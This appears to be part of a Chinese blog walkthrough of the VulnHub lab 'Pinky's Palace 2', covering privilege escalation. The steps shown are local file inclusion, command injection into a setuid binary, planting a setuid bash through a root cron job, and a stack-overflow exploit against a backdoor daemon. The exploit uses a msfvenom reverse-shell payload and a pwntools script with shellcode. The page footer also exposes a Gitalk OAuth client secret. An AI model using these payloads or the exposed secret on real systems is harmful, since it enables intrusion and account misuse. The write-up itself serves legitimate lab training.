+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201204829484.png" alt="image-20241201204829484"></p>
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201204935923.png" alt="image-20241201204935923"></p>
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201205012580.png" alt="image-20241201205012580"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在tools下发现qusb文件，Pinky made me this program so I can easily send messages to him.意思是说用这个程序给pinky发消息，cat一下发现没有权限</span><br><span class="line"> python3 -m http.server开个端口把这个文件下载一下，，，不让我下载</span><br><span class="line"> 又做了好久的信息收集找到了文件包含这里，试试能不能包含qusb  http:<span class="regexp">//</span>pinkydb:<span class="number">7654</span><span class="regexp">/pageegap.php?1337=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/home/</span>stefano<span class="regexp">/tools/</span>qsub</span><br><span class="line">wget http:<span class="regexp">//</span>pinkydb:<span class="number">7654</span><span class="regexp">/pageegap.php?1337=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/home/</span>stefano<span class="regexp">/tools/</span>qsub下载成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201210422445.png" alt="image-20241201210422445"></p>
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201211039219.png" alt="image-20241201211039219"></p>
+<p>之前就有遇到这种题–<a target="_blank" rel="noopener" href="https://g00d-r.github.io/vulnhub-18pwnlab-init/">vulnhub-18pwnlab-init&#x2F;</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用;把前面的语句闭合然后拼接上要执行的./qsub <span class="string">&quot;123;/bin/bash -p;&quot;</span>  开一个最高权限的shell，提示需要密码<span class="built_in">echo</span> <span class="variable">$TERM</span>   xterm-256color</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201211616282.png" alt="image-20241201211616282"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pinky</span>应该是开发者用的账号，还不是root，继续收集信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201211740242.png" alt="image-20241201211740242"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注意看这个txt文件是不是有点熟悉，看上面第二个图片，发送的消息就是保存在这个txt文件里的，或许可以二次提权，找不到利用的方法</span><br><span class="line"><span class="built_in">cat</span> .bash_history看一下历史命令发现 /usr/local/bin/backup.sh</span><br><span class="line">newgrp一下，更新一下用户信息然后<span class="built_in">cat</span> /usr/local/bin/backup.sh，其实就是备份网站的，</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab 看一下计划任务，发现/usr/local/bin目录下所有的可执行文件都是root进行定时任务的。</span><br><span class="line">尝试写一个反弹shell，就能弹到root权限账号</span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/shell <span class="comment">#复制一个bash交互到/tmp文件夹下并命名为shell</span></span><br><span class="line"><span class="built_in">chmod</span> ugo+x /tmp/shell <span class="comment">#赋予所有人运行权限</span></span><br><span class="line"><span class="built_in">chmod</span> u+s /tmp/shell <span class="comment">#当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限</span></span><br><span class="line">这是一种新型的弹shell</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们现在去/tmp等半小时，现在还没生成shell文件，先去打会守望先锋吧</span><br></pre></td></tr></table></figure>
+
+<p>​	<img src="/vulnhub-27pinky-s-palace-2//image-20241201213032589.png" alt="image-20241201213032589"><img src="/vulnhub-27pinky-s-palace-2//image-20241201212816594.png" alt="image-20241201212816594"></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ok，./<span class="keyword">shell</span> -<span class="keyword">p</span> 拥有完全的pinky权限</span><br><span class="line">查看一下root权限的进程<span class="keyword">ps</span> -aux | <span class="keyword">grep</span> root</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201221843464.png" alt="image-20241201221843464"></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个进程有点问题，查看一下<span class="built_in">string</span>s /daemon/panel,这是个后门，下载一下</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201222100289.png" alt="image-20241201222100289"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">放到ida中分析一下，按F5</span><br><span class="line">v8是消息内容，放到变量<span class="keyword">buf</span></span><br><span class="line"><span class="keyword"></span>我们所输入的数据会存放到<span class="keyword">buf中然后传参给handlecmd函数</span></span><br><span class="line"><span class="keyword"></span>双击handlecmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201222449226.png" alt="image-20241201222449226"></p>
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201222516746.png" alt="image-20241201222516746"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">把buf传递给handlecmd函数</span><br><span class="line">handlecmd里定义了字符串长度空间为112，调用了strcpy，但strcpy函数复制时没考虑长度，是全复制，就可能导致栈溢出。</span><br><span class="line">基于上述分析，理论上112个就能填满空间，再加一字节长（64位的程序就是8个随机字符），后面跟的是返回地址。</span><br><span class="line">从伪代码中可以看到send()发送的消息为信息收集时nc监听靶机31337端口时的回显。kali中运行该程序会开启端口31337，看来靶机上启动的31337端口运行就是这个程序。</span><br><span class="line"></span><br><span class="line">我们使用msf生成一个shellcode并且排除其中的“x00”,因为会造成截断，</span><br><span class="line">msfvenom -p linux/x64/shell_reverse_tcp <span class="attribute">LHOST</span>=192.168.240.130 <span class="attribute">LPORT</span>=1115 -f python -b <span class="string">&#x27;\x00&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241202003441734.png" alt="image-20241202003441734"></p>
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">from</span> <span class="variable">pwn</span> <span class="keyword">import</span> <span class="operator">*</span> #这是导入 <span class="variable">pwntools</span> 库，它是一个用于漏洞利用和二进制漏洞开发的 <span class="title class_">Python</span> 库。</span><br><span class="line"> </span><br><span class="line"><span class="variable">buf</span> <span class="operator">=</span>  <span class="variable">b</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="variable">buf</span> <span class="operator">+</span><span class="operator">=</span> <span class="variable">b</span><span class="string">&quot;<span class="char escape_">\x48</span><span class="char escape_">\x31</span>\xc9<span class="char escape_">\x48</span><span class="char escape_">\x81</span>\xe9\xf6\xff\xff\xff<span class="char escape_">\x48</span>\x8d&quot;</span></span><br><span class="line"><span class="variable">buf</span> <span class="operator">+</span><span class="operator">=</span> <span class="variable">b</span><span class="string">&quot;<span class="char escape_">\x05</span>\xef\xff\xff\xff<span class="char escape_">\x48</span>\xbb<span class="char escape_">\x40</span>\xe4<span class="char escape_">\x27</span>\xed<span class="char escape_">\x21</span>&quot;</span></span><br><span class="line"><span class="variable">buf</span> <span class="operator">+</span><span class="operator">=</span> <span class="variable">b</span><span class="string">&quot;\xa5<span class="char escape_">\x99</span>\x6e<span class="char escape_">\x48</span><span class="char escape_">\x31</span><span class="char escape_">\x58</span><span class="char escape_">\x27</span><span class="char escape_">\x48</span>\x2d\xf8\xff\xff&quot;</span></span><br><span class="line"><span class="variable">buf</span> <span class="operator">+</span><span class="operator">=</span> <span class="variable">b</span><span class="string">&quot;\xff\xe2\xf4\x2a\xcd\x7f<span class="char escape_">\x74</span>\x4b\xa7\xc6<span class="char escape_">\x04</span><span class="char escape_">\x41</span>&quot;</span></span><br><span class="line"><span class="variable">buf</span> <span class="operator">+</span><span class="operator">=</span> <span class="variable">b</span><span class="string">&quot;\xba<span class="char escape_">\x28</span>\xe8<span class="char escape_">\x69</span><span class="char escape_">\x32</span>\xd1\xd7<span class="char escape_">\x42</span>\xe4<span class="char escape_">\x23</span>\xb6\xe1&quot;</span></span><br><span class="line"><span class="variable">buf</span> <span class="operator">+</span><span class="operator">=</span> <span class="variable">b</span><span class="string">&quot;\x0d<span class="char escape_">\x69</span>\xec<span class="char escape_">\x11</span>\xac\xae\x0b\x4b\xb5\xc3<span class="char escape_">\x04</span>\x6a&quot;</span></span><br><span class="line"><span class="variable">buf</span> <span class="operator">+</span><span class="operator">=</span> <span class="variable">b</span><span class="string">&quot;\xbc<span class="char escape_">\x28</span>\xe8\x4b\xa6\xc7<span class="char escape_">\x26</span>\xbf\x2a\x4d\xcc<span class="char escape_">\x79</span>&quot;</span></span><br><span class="line"><span class="variable">buf</span> <span class="operator">+</span><span class="operator">=</span> <span class="variable">b</span><span class="string">&quot;\xaa\x9c\x1b\xb6\x8e\x1c\xb5\xb8\xed<span class="char escape_">\x22</span><span class="char escape_">\x41</span><span class="char escape_">\x22</span>&quot;</span></span><br><span class="line"><span class="variable">buf</span> <span class="operator">+</span><span class="operator">=</span> <span class="variable">b</span><span class="string">&quot;\x8d<span class="char escape_">\x49</span>\xc2<span class="char escape_">\x52</span>\xcd<span class="char escape_">\x99</span>\x3d<span class="char escape_">\x08</span>\x6d\xc0\xbf<span class="char escape_">\x76</span>&quot;</span></span><br><span class="line"><span class="variable">buf</span> <span class="operator">+</span><span class="operator">=</span> <span class="variable">b</span><span class="string">&quot;\xed<span class="char escape_">\x10</span><span class="char escape_">\x88</span>\x4f\xe1<span class="char escape_">\x27</span>\xed<span class="char escape_">\x21</span>\xa5<span class="char escape_">\x99</span>\x6e&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">ret</span> <span class="operator">=</span> <span class="title function_">p64</span>(<span class="number">0x400cfb</span>) #创建一个长度为 <span class="number">8</span> 字节的字符串，其中包含内存地址 <span class="number">0x400cfb</span> 的字节表示。这是一个返回地址，用于在堆栈溢出后控制程序的执行流程。</span><br><span class="line"><span class="comment">#ret = &quot;\xfb\x0c\x40\x00&quot;</span></span><br><span class="line"><span class="title function_">print</span> (<span class="variable">ret</span>)</span><br><span class="line"><span class="variable">payload</span> <span class="operator">=</span> <span class="variable">buf</span> <span class="operator">+</span> <span class="variable">ret</span> #创建一个新的字节串 <span class="variable">payload</span>，将 <span class="variable">buf</span> 和 <span class="variable">ret</span> 连接起来。这个 <span class="variable">payload</span> 包含了恶意输入，用于触发堆栈溢出，并将程序的执行流程指向 <span class="number">0x400cfb</span>。</span><br><span class="line"><span class="variable">r</span> <span class="operator">=</span> <span class="title function_">remote</span>(<span class="string">&quot;192.168.240.134&quot;</span>, <span class="number">31337</span>) #创建一个<span class="variable">IP</span> 地址为 <span class="number">192.168</span><span class="number">.1</span><span class="number">.3</span>，端口号为 <span class="number">31337</span> 的远程连接对象。这意味着代码将尝试与运行在本地计算机上的服务器建立连接。</span><br><span class="line"><span class="variable">r</span>.<span class="property">recv</span>() #接收来自远程服务器的数据。这里用于清空接收缓冲区。</span><br><span class="line"><span class="variable">r</span>.<span class="property">send</span>(<span class="variable">payload</span>) #向远程服务器发送 <span class="variable">payload</span> 数据，触发堆栈溢出漏洞。</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241202003420793.png" alt="image-20241202003420793"></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行一下就能拿<span class="built_in">到root</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241202003519154.png" alt="image-20241202003519154"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">真难</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        <a href="../tags/PWN%E6%B4%9E%E5%AD%A6%E4%B9%A0/"># PWN洞学习</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../misc-kali%E5%AE%89%E8%A3%85pwn%E7%8E%AF%E5%A2%83/">Misc-kali安装PWN环境</a>
+            
+            
+            <a class="next" rel="next" href="../vulnhub-26pinky-s-palace-1/">Vulnhub-26Pinky.s-Palace-1</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
